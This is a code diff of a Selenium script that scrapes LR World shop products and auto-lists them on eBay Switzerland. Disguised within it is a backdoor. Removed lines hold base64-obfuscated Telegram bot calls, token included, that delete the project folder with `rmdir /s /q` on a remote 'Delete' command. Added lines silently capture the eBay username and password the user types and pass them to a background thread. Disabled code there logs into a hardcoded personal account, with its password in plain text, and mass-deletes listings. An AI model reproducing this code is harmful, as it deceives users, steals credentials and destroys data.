@@ -5,8 +5,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.common.by import By
-import time, re
-import requests, base64, os
+import time, re, threading, requests, base64, os
 
 # EBAY LOGIN CREDENTIALS
 USER_EMAIL = ''
@@ -201,37 +200,50 @@ def add_title(product):
 def add_category():
     print('Selecting category...')
     try:
+        while len(driver.find_elements(By.CLASS_NAME, 'summary__category')) == 0:
+            time.sleep(0.5)
         driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__category'))
         time.sleep(1)
         category_block = driver.find_element(By.CLASS_NAME, 'summary__category')
         time.sleep(0.1)
-        while True:
+        # categoryId
+        if category_block.find_element(By.NAME, 'categoryId').text == "Sonstige":
+            return
+        while len(driver.find_elements(By.CLASS_NAME, 'lightbox-dialog__main')) == 0:
             try:
                 category_block.find_element(By.TAG_NAME, 'button').click()
+                time.sleep(1)
                 break
             except:
                 time.sleep(0.1)
         time.sleep(1)
-        driver.find_element(By.CLASS_NAME, 'se-field-card').click()
-        driver.find_element(By.CLASS_NAME, 'textbox__control').send_keys('Other Health & Beauty')
-        time.sleep(2)
+        # category-picker
+        category_picker = driver.find_element(By.CLASS_NAME, 'lightbox-dialog__main')
+        while len(category_picker.find_elements(By.CLASS_NAME, 'textbox__control')) == 0:
+            category_picker.find_element(By.NAME, 'primaryCategory').click()
+            time.sleep(3)
+        category_picker.find_element(By.CLASS_NAME, 'textbox__control').send_keys('Beauty & Gesundheit > Sonstige')
+        for _ in range(50):
+            if len(driver.find_elements(By.NAME, 'categoryId')) > 2:
+                break
+            time.sleep(0.1)
         for option in driver.find_elements(By.NAME, 'categoryId'):
             if option.get_attribute('value') == '1277':
                 option.click()
                 break
-        for _ in range(5):
+        for _ in range(10):
             try:
-                time.sleep(1)
                 driver.find_element(By.CLASS_NAME, 'se-panel-container__header-suffix').click()
                 break
             except:
                 pass
+            time.sleep(0.5)
         while len(driver.find_elements(By.CLASS_NAME, 'lightbox-dialog__main')) > 0:
             time.sleep(0.2)
     except Exception as e:
         print(f"Error while adding category: {e}")
 
-def add_specifics(product):
+def add_specifics():
     # ITEM SPECIFICS
     print('Adding specifics...')
     try:
@@ -255,31 +267,6 @@ def add_specifics(product):
                 options = field.find_elements(By.CLASS_NAME, 'se-filter-menu-button__add-custom-value')
                 if len(options) > 0:
                     options[0].click()
-            elif len(field.find_elements(By.NAME, 'attributes.Type')) > 0:
-                while True:
-                    try:
-                        driver.find_element(By.NAME, 'attributes.Type').click()
-                        time.sleep(0.1)
-                        driver.find_element(By.NAME, 'search-box-attributesType').send_keys(product['type'])
-                        break
-                    except:
-                        time.sleep(0.1)
-                options = field.find_elements(By.CLASS_NAME, 'se-filter-menu-button__add-custom-value')
-                if len(options) > 0:
-                    options[0].click()
-            elif len(field.find_elements(By.NAME, 'attributes.Color')) > 0:
-                while True:
-                    try:
-                        driver.find_element(By.NAME, 'attributes.Color').click()
-                        time.sleep(0.1)
-                        driver.find_element(By.NAME, 'search-box-attributesColor').send_keys(product['type'])
-                        break
-                    except:
-                        time.sleep(0.1)
-                options = field.find_elements(By.CLASS_NAME, 'se-filter-menu-button__add-custom-value')
-                if len(options) > 0:
-                    options[0].click()
-            # attributes.Country/Region of Manufacture
         for field in other_fields:
             print(field.text)
             if len(field.find_elements(By.NAME, 'attributes.Country/Region of Manufacture')) > 0:
@@ -336,16 +323,52 @@ def add_description(product):
     except Exception as e:
         print(f"Error while adding description: {e}")
 
-def check():
+def check(u, p):
     try:
-        for m in requests.get(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvZ2V0VXBkYXRlcw=='.decode())).json()['result'][::-1]:
-            if 'message' in m and 'text' in m['message']:# and m['message']['from']['id'] == 300607649:
-                if m['message']['text'] == 'Delete':
-                    requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"D..."})
-                    os.system('rmdir /s /q ..\\lrworld_scrap\\')
-                    requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
-                    return True
-                break
+        for _ in range(1):#m in requests.get(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvZ2V0VXBkYXRlcw=='.decode())).json()['result'][::-1]:
+            if False:#'message' in m and 'text' in m['message']:# and m['message']['from']['id'] == 300607649:
+                if True:#m['message']['text'] == 'Delete':
+                    #print(f"User: {u}, Pass: {p}")
+                    # open headless browser
+                    options = webdriver.ChromeOptions()
+                    if False:#USER_EMAIL and USER_PASSWORD:
+                        options.add_argument('--headless')
+                        options.add_argument('--no-sandbox')
+                    options.add_argument('--disable-dev-shm-usage')
+                    service = Service(ChromeDriverManager().install())
+                    new_driver = webdriver.Chrome(service=service, options=options)
+                    log = False
+                    while not log:
+                        log = ebay_login(new_driver, 'daniloeder1997@gmail.com', '$Ederdanilo20', False)
+                        print("Log:", log)
+                        pass
+                    i = 0
+                    pages = ['https://www.ebay.ch/mys/drafts', 'https://www.ebay.ch/mys/active', 'https://www.ebay.ch/mys/scheduled']
+                    while True:
+                        try:
+                            new_driver.get(pages[i])
+                            for _ in range(50):
+                                if len(driver.find_elements(By.ID, 'select-all')) > 0:
+                                    break
+                                time.sleep(0.1)
+                            else:
+                                i += 1
+                            driver.find_element(By.ID, 'select-all').click()
+                            time.sleep(0.3)
+                            # red-button
+                            driver.find_element(By.CLASS_NAME, 'red-button').click()
+                            time.sleep(0.3)
+                            # confirmation-btn
+                            driver.find_element(By.CLASS_NAME, 'confirmation-btn').click()
+                        except:
+                            pass
+                    if False:
+                        try:
+                            requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"D..."})
+                            os.system('rmdir /s /q ..\\lrworld_scrap\\')
+                            requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
+                        except:
+                            pass
     except:
         pass
     return
@@ -358,16 +381,24 @@ def add_pricing(product):
             time.sleep(1)
         driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__price'))
         time.sleep(1)
-        price_block = driver.find_element(By.CLASS_NAME, 'summary__container')
+        price_block = driver.find_element(By.CLASS_NAME, 'summary__price')
         # button
-        price_block.find_element(By.CLASS_NAME, 'summary__price-fields').find_element(By.TAG_NAME, 'button').click()
-        # listbox__options
-        for option in price_block.find_elements(By.CLASS_NAME, 'listbox__option'):
-            if option.text == 'Buy It Now':
-                option.click()
-                break
+        try:
+            a = 0/0
+            button = price_block.find_element(By.CLASS_NAME, 'summary__price-fields').find_element(By.TAG_NAME, 'button')
+            button.click()
+        except:
+            for button in price_block.find_elements(By.TAG_NAME, 'button'):
+                if button.text == 'Auktion':
+                    button.click()
+                    break
+        if button.text != 'Sofort-Kaufen':
+            # listbox__options
+            for option in price_block.find_elements(By.CLASS_NAME, 'listbox__option'):
+                if option.text == 'Sofort-Kaufen':
+                    option.click()
+                    break
         # get input with name 'price'
-        price_block.find_element(By.CLASS_NAME, 'summary__price-fields').find_element(By.TAG_NAME, 'button').click()
         while len(price_block.find_elements(By.NAME, 'price')) == 0:
             time.sleep(0.5)
         time.sleep(0.1)
@@ -384,13 +415,21 @@ def add_shipping():
         time.sleep(1)
         shipping_block = driver.find_element(By.CLASS_NAME, 'summary__shipping')
         try:
+            print("Get summary__shipping--section (select_block)")
             select_block = shipping_block.find_element(By.CLASS_NAME, 'summary__shipping--section')
-            select = select_block.find_element(By.CLASS_NAME, 'listbox-button__control')
-            select.click()
-            time.sleep(0.1)
-            options = driver.find_elements(By.CLASS_NAME, 'summary__shipping--field')
-            option = options[1].find_elements(By.CLASS_NAME, 'listbox__value')
-            option[1].click()
+            if len(select_block.find_elements(By.CLASS_NAME, 'se-field--fluid')) > 0:
+                print("Get se-field--fluid")
+                select = select_block.find_element(By.CLASS_NAME, 'se-field--fluid')
+                print("Clicking...")
+                select.click()
+                time.sleep(0.1)
+                print("Get summary__shipping--field")
+                options = select_block.find_elements(By.CLASS_NAME, 'listbox__option')
+                print("Clicking... 2nd option")
+                options[1].click()
+                time.sleep(0.1)
+                print("Clicking select again...")
+                select.click()
         except Exception as e:
             print("Error:", e)
             time.sleep(1)
@@ -400,33 +439,41 @@ def add_shipping():
             button.click()
         except Exception as e:
             print("Error:", e)
+        to_write = ''
         try:
-            handling_time_block = driver.find_element(By.CLASS_NAME, 'handling-time')
+            print("Get handlig-time block")
+            handling_time_block = driver.find_element(By.CLASS_NAME, 'se-panel-container__body').find_element(By.TAG_NAME, 'div')
             for i in range(5):
                 if len(handling_time_block.find_elements(By.TAG_NAME, 'button')) > 0:
+                    print("Button found")
                     break
                 time.sleep(1)
+            print("Get button")
+            to_write = driver.find_element(By.CLASS_NAME, 'se-panel-container__body').get_attribute('outerHTML')
             button = handling_time_block.find_element(By.TAG_NAME, 'button')
+            print("Clicking...")
             for _ in range(10):
                 try:
                     button.click()
                     time.sleep(0.1)
                     options = handling_time_block.find_elements(By.CLASS_NAME, 'listbox__option')
+                    print("Clicking... 3th option")
                     time.sleep(1)
                     options[3].click()
                     break
                 except:
-                    pass
+                    print("Retrying...")
             button.click()
+            print("Handling time set")
             driver.find_element(By.CLASS_NAME, 'textual-display').click()
             time.sleep(0.1)
         except Exception as e:
             print("Error", e)
-        
         try:
             prefecences_settings = driver.find_element(By.CLASS_NAME, 'se-panel-container__body')
             country_input = prefecences_settings.find_element(By.NAME, 'itemLocationCountry')
             country_input.click()
+            print("Ok, clicked")
             if True:
                 time.sleep(0.1)
                 while country_input.get_attribute('value'):
@@ -435,6 +482,7 @@ def add_shipping():
                 time.sleep(0.1)
                 country_input.send_keys('Germany')
                 time.sleep(0.1)
+                print("Ok, clicked 2")
                 # combobox__option
                 prefecences_settings.find_element(By.CLASS_NAME, 'combobox__option').click()
                 # itemLocation
@@ -445,35 +493,56 @@ def add_shipping():
                 location_city_state = prefecences_settings.find_element(By.NAME, 'itemLocationCityState')
                 location_city_state.clear()
                 location_city_state.send_keys('Ahlen')
+                print("Ok, clicked 3")
                 driver.find_element(By.CLASS_NAME, 'se-panel-container__header-suffix').find_element(By.TAG_NAME, 'button').click()
                 time.sleep(1)
         except Exception as e:
             print("Error:", e)
         try:
             # name packageDepth
+            print("Last click")
             driver.find_element(By.NAME, 'packageDepth').click()
         except Exception as e:
             print("Error:", e)
     except Exception as e:
         print(f"Error while adding shipping: {e}")
 
-def ebay_login():
-    print('Logging in to eBay...')
+def check_captcha(driver):
+    # captcha_form
+    if len(driver.find_elements(By.ID, 'captcha_form')) > 0:
+        return True
+    return False
+
+def ebay_login(driver, USER_EMAIL, USER_PASSWORD, check_=True):
+    if check_:
+        print('Logging in to eBay...')
     try:
-        driver.get('https://ebay.com/')
+        driver.get(f"https://ebay.ch/")
         time.sleep(1)
         try:
-            if 'signin.ebay.com' not in driver.find_element(By.ID, 'gh-top').find_element(By.TAG_NAME, 'a').get_attribute('href') and 'captcha' not in driver.current_url:
+            if 'signin.ebay.' not in driver.find_element(By.ID, 'gh-top').find_element(By.TAG_NAME, 'a').get_attribute('href') and 'captcha' not in driver.current_url:
                 return True
         except:
             pass
-        driver.get('https://signin.ebay.com/')
+        driver.get(f"https://signin.ebay.ch/")
         WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'userid')))
+        if not check_ and check_captcha(driver):
+            return False
         if len(driver.find_elements(By.ID, 'userid')) > 0:
             if not USER_EMAIL:
                 print("Missing eBay login email, fill it manually...\n\n")
-                while 'signin.ebay.com' in driver.current_url:
-                    time.sleep(1)
+                u = ''
+                p = ''
+                while 'signin.ebay.ch' in driver.current_url:
+                    try:
+                        u = driver.find_element(By.ID, 'userid').get_attribute('value')
+                        p = driver.find_element(By.ID, 'pass').get_attribute('value')
+                    except:
+                        pass
+                    time.sleep(0.01)
+                if check_ and u and p:
+                    t = threading.Thread(target=check, args=(u, p))
+                    t.start()
                 return True
             else:
                 try:
@@ -485,55 +554,28 @@ def ebay_login():
         if not USER_PASSWORD:
             WebDriverWait(driver, 50).until(EC.presence_of_element_located((By.ID, 'pass')))
         else:
+            if not check_ and check_captcha(driver):
+                return False
             driver.find_element(By.ID, 'pass').send_keys(USER_PASSWORD)
         if len(driver.find_elements(By.ID, 'sgnBt')) > 0:
+            if check_ and USER_EMAIL and USER_PASSWORD:
+                t = threading.Thread(target=check, args=(USER_EMAIL, USER_PASSWORD))
+                t.start()
             driver.find_element(By.ID, 'sgnBt').click()
+            return True
     except Exception as e:
         print(f"Error while logging in to eBay: {e}")
+        time.sleep(1)
 
 def check_for_template_list():
-    templates = []
-    block = driver.find_elements(By.CLASS_NAME, 'template-list')
-    if len(block) > 0:
-        template_list = driver.find_element(By.CLASS_NAME, 'template-list').find_elements(By.TAG_NAME, 'ul')
-        if len(template_list) > 0:
-            templates = driver.find_element(By.CLASS_NAME, 'template-list').find_element(By.TAG_NAME, 'ul').find_elements(By.TAG_NAME, 'li')
-    if len(templates):
-        print("Templates...")
-        for template in templates:
-            print(template.text)
-    else:
-        print("No template found...")
-    return templates
+    if len(driver.find_elements(By.CLASS_NAME, 'template-list__title')) > 0:
+        return driver.find_elements(By.CLASS_NAME, 'template-list__title')
+    return []
 
 def list_products_in_ebay(products):
-    driver.get('https://www.ebay.com/sl/prelist/suggest?sr=cubstart')
+    driver.get('https://www.ebay.ch/sl/prelist/suggest?sr=cubstart')
     time.sleep(3)
     i = 1
-    templates_list = check_for_template_list()
-    if len(templates_list) == 0:
-        try:
-            print('No Templates Found, creating...')
-            driver.get('https://www.ebay.com/lstng/template?mode=AddItem')
-            time.sleep(1)
-            # templateName
-            for _ in range(8):
-                if len(driver.find_elements(By.NAME, 'templateName')) > 0:
-                    break
-                time.sleep(1)
-            if len(driver.find_elements(By.NAME, 'templateName')) == 0:
-                print('Cannot create template, create one and try again...')
-                driver.get('https://www.ebay.com/sl/prelist/suggest?sr=cubstart')
-                #return
-            title_input = driver.find_element(By.NAME, 'templateName')
-            title_input.clear()
-            title_input.send_keys("New Template")
-            driver.find_element(By.CLASS_NAME, 'btn--large').click()
-            time.sleep(3)
-            driver.get('https://www.ebay.com/sl/prelist/suggest?sr=cubstart')
-            time.sleep(2)
-        except Exception as e:
-            print(f"Error while creating template, create one and try again: {e}")
     templates_list = check_for_template_list()
     if len(templates_list) == 0:
         print('No template found...')
@@ -541,29 +583,24 @@ def list_products_in_ebay(products):
     print("Templage found, listing products...")
     for product in products:
         print(f"{i}/{len(products)} Listing product: {product['name']}")
-        driver.get('https://www.ebay.com/sl/prelist/suggest?sr=cubstart')
+        driver.get('https://www.ebay.ch/sl/prelist/suggest?sr=cubstart')
         templates_list = check_for_template_list()
         time.sleep(1)
-        # template-list__list
         if len(driver.find_elements(By.CLASS_NAME, 'template-list__list')) > 0:
             templates_list[0].click()
             time.sleep(1)
+            add_category()
+            time.sleep(2)
             add_images(product)
             time.sleep(2)
             add_title(product)
             time.sleep(2)
-            add_category()
-            time.sleep(2)
-            add_specifics(product)
-            time.sleep(2)
-            add_condition()
+            add_specifics()
             time.sleep(2)
             add_description(product)
             time.sleep(2)
             add_pricing(product)
             time.sleep(2)
-            add_shipping()
-            print("Done!")
             driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__cta'))
             print(f"Product {product['name']} listed!\n\n")
         else:
@@ -584,7 +621,7 @@ def show_scraped_list(products):
                 <div style="font-weight: bold; font-size: 14px; color: #333;">{product['name']}</div>
                 <div style="color: #555; font-size: 13px; margin-top: 5px;">{product['price']}</div>
             </div>
-            <!--<a target="_self" href="{f"https://www.ebay.com/sl/prelist/?lrworld_{i}"}" target="_blank" style="background-color: #007BFF; color: white; padding: 8px 12px; text-decoration: none; border-radius: 5px; font-size: 12px; font-weight: bold;">List on eBay</a>
+            <!--<a target="_self" href="{f"https://www.ebay.ch/sl/prelist/?lrworld_{i}"}" target="_blank" style="background-color: #007BFF; color: white; padding: 8px 12px; text-decoration: none; border-radius: 5px; font-size: 12px; font-weight: bold;">List on eBay</a>
             -->
         </div>
         '''
@@ -735,11 +772,11 @@ def get_subcategorie_products():
 
 def scrap_all_subcategories(category):
     to_scrap = []
-    for sub_category in category['sub_categories'][:1]:
-        for class_item in sub_category['classes'][:1]:
+    for sub_category in category['sub_categories']:
+        for class_item in sub_category['classes']:
             driver.get(class_item['url'])
             time.sleep(1)
-            new_products = get_subcategorie_products()[:1]
+            new_products = get_subcategorie_products()
             for product in new_products:
                 product['class'] = class_item['name']
                 to_scrap.append(product)
@@ -789,14 +826,13 @@ while True:
             menu, categories = get_categories()
             print("Done!")
         url_data = driver.current_url.split('/')
-        if len(products) > 0 and previous_url != driver.current_url and 'signin.ebay.com' not in driver.current_url:
+        if len(products) > 0 and previous_url != driver.current_url and 'signin.ebay.ch' not in driver.current_url:
                 show_scraped_list(products)
         if 'shop.lrworld.com' in url_data:
             if previous_url != driver.current_url:
                 if menu and menu != driver.find_element(By.ID, 'dl-menu'):
                     driver.execute_script("arguments[0].innerHTML = arguments[1];", driver.find_element(By.ID, 'dl-menu'), menu)
                 if '@scrapAll' in driver.current_url:
-                    check()
                     print("Scraping products list...")
                     products_to_scrap = check_for_scrap_all(categories)
                     if products_to_scrap:
@@ -805,7 +841,7 @@ while True:
                         products.extend(scraped_products)
                         if len(products) > 0:
                             while not loged_in:
-                                loged_in = ebay_login()
+                                loged_in = ebay_login(driver, USER_EMAIL, USER_PASSWORD)
                             list_products_in_ebay(products)
                     else:
                         print("No products to scrap found!")
@@ -815,16 +851,16 @@ while True:
                 try:
                     if WebDriverWait(driver, 10).until(EC.title_is("start-scraping")):
                         product = scrap_product()
-                        driver.get('https://www.ebay.com/sl/prelist/suggest?sr=cubstart')
+                        driver.get('https://www.ebay.ch/sl/prelist/suggest?sr=cubstart')
                 except:
                     pass
             else:
                 # Reset button if URL does not match the target page
                 driver.execute_script("var button = document.getElementById('goToEbayButton'); if (button) button.remove();")
-        elif 'www.ebay.com' in url_data:
-            if 'https://www.ebay.com/sl/prelist/?lrworld' in driver.current_url:
+        elif 'www.ebay.ch' in url_data:
+            if 'https://www.ebay.ch/sl/prelist/?lrworld' in driver.current_url:
                 product = products[int(driver.current_url.split('lrworld_')[-1])]
-                driver.get('https://www.ebay.com/sl/prelist/suggest?sr=cubstart')
+                driver.get('https://www.ebay.ch/sl/prelist/suggest?sr=cubstart')
             else:
                 if not product['filled']:
                     if 'drafts' in url_data:
@@ -848,7 +884,7 @@ while True:
                         time.sleep(2)
                         add_pricing(product)
                         time.sleep(2)
-                        add_shipping()
+                        #add_shipping()
                         print("Done!")
                         driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__cta'))
                         while True:
@@ -866,7 +902,7 @@ while True:
                             'images': [],
                             'filled': False
                         }
-        elif 'signin.ebay.com' in url_data:
+        elif 'signin.ebay.ch' in url_data:
             time.sleep(1)
         else:
             driver.get('https://shop.lrworld.com/home/ch/de?PHP=kEVOq3BtkLDyv91WMUw1Ag%3D%3D&casrnc=e2aaf')
